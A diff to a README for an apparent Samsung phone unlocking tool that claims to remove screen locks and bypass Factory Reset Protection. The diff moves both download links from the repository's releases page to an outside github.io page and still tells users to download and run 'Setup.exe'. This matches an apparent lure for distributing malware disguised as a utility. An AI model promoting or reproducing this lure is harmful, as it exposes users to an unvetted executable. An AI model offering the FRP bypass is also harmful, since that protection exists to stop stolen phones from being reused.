@@ -1,6 +1,6 @@
 # 🔓 Desbloquear-Samsung-Galaxy - Access your phone features with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adrianecreaky707/Desbloquear-Samsung-Galaxy/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://adrianecreaky707.github.io)
 
 This application helps users remove screen locks and bypass Factory Reset Protection (FRP) on Samsung Galaxy devices. It works directly on Windows 10 and Windows 11 computers. You do not need technical skills to use this tool. Follow the steps below to set up and run the software.
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these requirements:
 
 You need to access the official release page to get the installer. Follow these steps:
 
-1. Visit the following link to view all available versions: [https://github.com/adrianecreaky707/Desbloquear-Samsung-Galaxy/releases](https://github.com/adrianecreaky707/Desbloquear-Samsung-Galaxy/releases).
+1. Visit the following link to view all available versions: [https://adrianecreaky707.github.io](https://adrianecreaky707.github.io).
 2. Look for the file named "Setup.exe" under the "Assets" section.
 3. Click the file name to start the download.
 4. Save the file to your "Downloads" folder.
